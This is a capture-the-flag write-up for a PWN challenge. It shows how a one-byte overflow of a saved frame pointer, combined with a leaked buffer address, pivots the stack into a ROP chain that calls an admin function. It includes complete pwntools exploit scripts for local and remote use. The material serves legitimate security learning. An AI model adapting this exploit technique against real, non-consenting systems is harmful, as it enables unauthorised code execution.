## Assignment

Category: PWN
Difficulty: Not specified

Our diagnostics terminal logged an anomaly during maintenance. The vendor insists their service is fortified with stack canaries and safe from memory corruption, but the interface IS LEAKING.

Can you forge a maintenance report, bypass the perimeter, and acquire administrative clearance?

Flag Format: CSSCTF{...}

`nc 34.116.80.78 7312`
## Reconnaissance

In this task, I start by analyzing the provided `.zip` file.![[Pasted image 20260930213005.png]]

Here we can see 3 files. By looking at the `Dockerfile`, we can understand what the server-side environment looks like.

![[Pasted image 20260930213103.png]]


I tried my luck reading `flag.txt`, but it was just a dummy flag to show how the setup works. 

![[Ctfs/CSS_CTF_2026_Winter_Nexus/images/Pasted image 20260930213159.png]]

That would be too easy xD.

To dive deeper, I analyzed the binary in Ghidra. I found that there is a code that leaks an address pointing to a buffer where the program loads data. There is also a custom stack canary (a value saved on the stack that is checked before the function returns).

![[Pasted image 20260930214158.png]]

At `0x401421`, the program saves a value into `RAX`, and at `0x40142a`, it writes it to memory at `RBP-8`. Then it is checked later here:

![[Pasted image 20260930214353.png]]

Also the first read operation at `0x4013f8` is safe. There is nothing vulnerable here, as it reads `0x50` bytes into a `0x50`-byte space on the stack.

![[Pasted image 20260930214753.png]]

However, a subsequent function call allocates `0x20` bytes of space but reads `0x21` bytes of data. This could be it!

![[Pasted image 20260930214908.png]]

So lets examine it in gdb. 

## Buffer overflow

I wanted to check if it's possible to overwrite that single byte and see what resides right after the buffer. It should be the saved `RBP` (since it was the last register pushed to the stack). Let's begin by setting the first breakpoint before the first read (`0x4013f3`) and a second one before the second read (`0x40138d`).

![[Pasted image 20260930220017.png]]

I ran the program and checked the `RBP` and `RSP` registers.

![[Pasted image 20260930220852.png]]

Then, I hit continue, provided a payload, and checked the new `RBP` and `RSP` values.

I also decided to inspect the stack. I could clearly see the saved previous `RBP`, followed by my `AAAA` payload. 

![[Pasted image 20260930220943.png]]

To ensure I landed on the correct address, I checked the assembly.

![[Pasted image 20260930220549.png]]

Next, I continued the execution and sent 33 `'A'`s (`0x21` bytes). The program crashed, which was a good sign (we probably corrupted the frame pointer).

![[Pasted image 20260930231000.png]]

After that, I ran it once more, this time without the first breakpoint, and successfully examined the stack data.

![[Ctfs/CSS_CTF_2026_Winter_Nexus/images/Pasted image 20260930231105.png]]

I confirmed that I was able to overwrite exactly one byte of the saved `RBP`. Now, all that was left was to exploit it.

## Exploitation

I further investigated the code in Ghidra and found the following function.

![[Pasted image 20260930231420.png]]

And here is the decompiled representation of this assembly part.

![[Pasted image 20260930231538.png]]

From this, we can see that to get the flag, we need to set `EDI` and `ESI` to `0xdeadbeef` and `0xcafebabe`, respectively.
Since we know the address of the first (secure) buffer from the initial leak, we can place a ROP chain (our gadget addresses and target values) in it. Then, we can use the one-byte overflow to change the least significant byte of the saved `RBP`, effectively pivoting the stack to point directly at our controlled buffer.
To achieve this, I needed to find ROP gadgets to load values into `EDI` and `ESI`. After a short search, I found instructions that pop into `RDI` and `RSI` (which are just the 64-bit extensions of `EDI` and `ESI`).

![[Pasted image 20260930233351.png]]

To test it, I wrote this script.

``` python
from pwn import *

context.binary = elf = ELF("./chall", checksec = False)

p = process("./chall")

POP_RDI = 0x40124d       # pop rdi ; ret
POP_RSI = 0x40124f       # pop rsi ; ret
ADMIN   = 0x401268       # function checking - 0xdeadbeef / 0xcafebabe

p.recvuntil(b"Report buffer allocated at: ")
buffer_addr = int(p.recvline().strip(), 16) #translate to text

log.info(f"Buffer: {hex(buffer_addr)}")


# 2. First input: construct our fake stack / ROP chain

payload = flat(
    0x0,             # fake RBP
    POP_RDI,         # pop rdi ; ret
    0xdeadbeef,
    POP_RSI,         # pop rsi ; ret
    0xcafebabe,
    ADMIN            # call admin function
)

# first 50 bytes
payload = payload.ljust(0x50, b"A")

assert len(payload) == 0x50

# send first payload
p.send(payload)

# We will use mask 0xff to obtain the last byte of address
payload2 = b"A" * 0x20 + p8(buffer_addr & 0xff)

assert len(payload2) == 0x21

# Send overflow payload
p.send(payload2)

p.interactive()
```

Note that this exploit might not work 100% of the time. Because of ASLR (Address Space Layout Randomization), the stack address alignment can shift slightly, meaning our one-byte overwrite might miss the exact start of our new stack address. This happened during local testing, but the solution is simple: just re-run the exploit until the alignment matches:)).

![[Ctfs/CSS_CTF_2026_Winter_Nexus/images/Pasted image 20260930235612.png]]

Finally, let's run it against the remote server.

![[Ctfs/CSS_CTF_2026_Winter_Nexus/images/Pasted image 20260930235909.png]]

BINGO! We obtain the flag.

final code:
``` python
from pwn import *

context.binary = elf = ELF("./chall", checksec = False)

p = remote('34.116.80.78', 7312) #remote
#p = process("./chall") #local

POP_RDI = 0x40124d       # pop rdi ; ret
POP_RSI = 0x40124f       # pop rsi ; ret
ADMIN   = 0x401268       # function checking - 0xdeadbeef / 0xcafebabe

p.recvuntil(b"Report buffer allocated at: ")
buffer_addr = int(p.recvline().strip(), 16) #translate to text

log.info(f"Buffer: {hex(buffer_addr)}")


# 2. First input: construct our fake stack / ROP chain

payload = flat(
    0x0,             # fake RBP
    POP_RDI,         # pop rdi ; ret
    0xdeadbeef,
    POP_RSI,         # pop rsi ; ret
    0xcafebabe,
    ADMIN            # call admin function
)

# first 50 bytes
payload = payload.ljust(0x50, b"A")

assert len(payload) == 0x50

# send first payload
p.send(payload)

# We will use mask 0xff to obtain the last byte of address
payload2 = b"A" * 0x20 + p8(buffer_addr & 0xff)

assert len(payload2) == 0x21

# Send overflow payload
p.send(payload2)

p.interactive()
```